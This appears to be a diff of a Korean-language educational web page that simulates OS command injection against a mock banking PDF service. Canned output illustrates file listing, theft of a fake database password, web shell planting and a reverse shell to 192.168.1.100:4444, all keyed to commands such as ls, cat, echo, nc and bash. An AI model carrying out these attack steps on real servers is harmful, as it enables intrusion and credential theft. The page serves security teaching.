-            setTimeout(() => {
-                robotText.innerText = "작업 1 실행: Ping...";
-                addLog("Ping 8.8.8.8 실행 중...", "text-green-400");
-                document.getElementById('outputArea').classList.add('opacity-100');
-            }, 2500);
-
-            // 4. If Attack, Processing Task 2
-            setTimeout(() => {
-                if (isAttack) {
-                    robotText.innerText = "어? 다음 명령이 있네?";
-                    document.getElementById('robot').classList.replace('text-indigo-600', 'text-red-600');
-                    // Shake animation for confusion
-                    document.getElementById('robot').classList.add('animate-shake');
-                    
-                    setTimeout(() => {
-                        robotText.innerText = "작업 2 실행: 파일 목록 조회 (ls)";
-                        document.getElementById('robot').classList.remove('animate-shake');
-                        addLog("!!! 경고 !!! 추가 명령어 실행 감지", "text-red-400 font-bold");
-                        addLog("root     bin     etc     home    var", "text-white mt-2");
-                        addLog("index.php  config.php  secret_db_pass.txt", "text-yellow-300");
-                        
-                        // Show Explanation Box
-                        setTimeout(() => {
-                            document.getElementById('explanationBox').classList.remove('hidden');
-                        }, 1000);
-                    }, 2000);
-
+                // 공격 유형별 결과
+                if (input.includes('ls')) {
+                    addTerminalLine('> drwxr-xr-x  config/', 'text-cyan-300');
+                    addTerminalLine('> -rw-r--r--  database.php', 'text-orange-300');
+                    addTerminalLine('> -rw-------  .env', 'text-red-300 font-bold');
+                    addTerminalLine('> -rw-r--r--  customer_data.db', 'text-red-300 font-bold');
+                    showAttackResult('파일 목록 조회', '서버의 파일 및 디렉토리 구조 노출', 'config/database.php\n.env (환경변수)\ncustomer_data.db (고객 DB)');
+                } else if (input.includes('cat') && input.includes('database')) {
+                    addTerminalLine('> <?php', 'text-purple-300');
+                    addTerminalLine('> $db_host = "localhost";', 'text-yellow-300');
+                    addTerminalLine('> $db_user = "bank_admin";', 'text-red-300 font-bold');
+                    addTerminalLine('> $db_pass = "P@ssw0rd!2024#KB";', 'text-red-300 font-bold');
+                    showAttackResult('DB 접속정보 탈취', 'database.php 파일 내용 읽기 성공', 'Host: localhost\nUser: bank_admin\nPassword: P@ssw0rd!2024#KB\n\n→ 전체 고객 DB 접근 가능!');
+                } else if (input.includes('echo') && input.includes('php')) {
+                    addTerminalLine('> 웹쉘 파일 생성 중...', 'text-red-400');
+                    addTerminalLine('> shell.php 생성 완료', 'text-red-400 font-bold');
+                    addTerminalLine('> 경로: /var/www/bank/uploads/shell.php', 'text-orange-300');
+                    showAttackResult('백도어 설치', '웹쉘 파일(shell.php) 생성', '파일: shell.php\n기능: 원격 명령어 실행\n경로: /var/www/bank/uploads/\n\n→ 지속적인 서버 제어 가능!');
+                } else if (input.includes('nc') || input.includes('bash')) {
+                    addTerminalLine('> 리버스 쉘 연결 시도...', 'text-red-400');
+                    addTerminalLine('> 연결 대상: 192.168.1.100:4444', 'text-orange-300');
+                    addTerminalLine('> [!] 원격 접속 세션 확립됨', 'text-red-400 font-bold');
+                    showAttackResult('리버스쉘 연결', '공격자 서버로 역방향 쉘 연결', '타겟: 192.168.1.100:4444\n상태: 연결 성공\n\n→ 공격자가 서버 직접 제어 가능!');
                 } else {
-                    robotText.innerText = "모든 작업 완료!";
-                    addLog("Ping 성공: 0% 손실", "text-green-400");
-                    document.getElementById('robot').classList.replace('text-indigo-600', 'text-slate-700');
+                    addTerminalLine('> 알 수 없는 명령어 실행됨', 'text-red-300');
+                    showAttackResult('임의 명령어 실행', '입력값에 포함된 명령어가 실행됨', input);
                 }
-            }, 4500);
+
+                document.getElementById('step3Icon').className = 'fa-solid fa-circle-exclamation text-red-400 animate-blink';
+
+            } else {
+                await sleep(800);
+                addTerminalLine('> PDF 생성 완료: transaction_123456.pdf', 'text-green-400');
+                addTerminalLine('> [SUCCESS] 정상 처리', 'text-green-400 font-bold');
+                
+                document.getElementById('step3Icon').className = 'fa-solid fa-check-circle text-green-400';
+                showSuccessResult();
+            }
         }
 
-        function addLog(text, classes) {
+        function showAttackResult(title, desc, data) {
+            const resultBox = document.getElementById('resultBox');
+            const resultCard = document.getElementById('resultCard');
+            const resultIcon = document.getElementById('resultIcon');
+            const resultTitle = document.getElementById('resultTitle');
+            const resultDesc = document.getElementById('resultDesc');
+            const stolenDataBox = document.getElementById('stolenDataBox');
+            const stolenData = document.getElementById('stolenData');
+
+            resultCard.className = 'rounded-2xl border-4 shadow-2xl p-5 bg-red-50 border-red-500';
+            resultIcon.className = 'fa-solid fa-skull-crossbones text-4xl text-red-600';
+            resultTitle.className = 'text-lg font-black mb-1 text-red-900';
+            resultDesc.className = 'text-xs leading-relaxed text-red-800';
+
+            resultTitle.innerHTML = `<i class="fa-solid fa-fire-flame-curved"></i> ${title}`;
+            resultDesc.innerHTML = `<strong>공격 성공:</strong> ${desc}<br><span class="text-red-700 font-bold">임의 명령어 실행 취약점 확인</span>`;
+            
+            stolenData.innerText = data;
+            stolenDataBox.classList.remove('hidden');
+            
+            document.getElementById('judgement').innerHTML = '<span class="text-red-400">취약 (Vulnerable)</span>';
+            document.getElementById('evidence').innerText = '지정된 명령어 외 임의 명령 실행 가능';
+            
+            resultBox.classList.remove('hidden');
+        }
+
+        function showSuccessResult() {
+            const resultBox = document.getElementById('resultBox');
+            const resultCard = document.getElementById('resultCard');
+            const resultIcon = document.getElementById('resultIcon');
+            const resultTitle = document.getElementById('resultTitle');
+            const resultDesc = document.getElementById('resultDesc');
+            const stolenDataBox = document.getElementById('stolenDataBox');
+
+            resultCard.className = 'rounded-2xl border-4 shadow-2xl p-5 bg-emerald-50 border-emerald-500';
+            resultIcon.className = 'fa-solid fa-circle-check text-4xl text-emerald-600';
+            resultTitle.className = 'text-lg font-black mb-1 text-emerald-900';
+            resultDesc.className = 'text-xs leading-relaxed text-emerald-800';
+
+            resultTitle.innerHTML = 'PDF 생성 완료';
+            resultDesc.innerHTML = '정상적인 입력값으로 PDF가 생성되었습니다.<br>안전한 코드 사용 시 이와 같이 동작합니다.';
+
+            stolenDataBox.classList.add('hidden');
+            
+            document.getElementById('judgement').innerHTML = '<span class="text-green-400">양호 (Good)</span>';
+            document.getElementById('evidence').innerText = '허용된 명령어만 실행됨';
+            
+            resultBox.classList.remove('hidden');
+        }
+
+        function addTerminalLine(text, className = 'text-green-300') {
             const div = document.createElement('div');
-            div.className = classes;
-            div.innerText = text;
+            div.className = className;
+            div.textContent = text;
             document.getElementById('terminalLines').appendChild(div);
         }
 
-        // Init
-        updatePreview();
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        updateCommandPreview();
     </script>
 </body>
 </html>
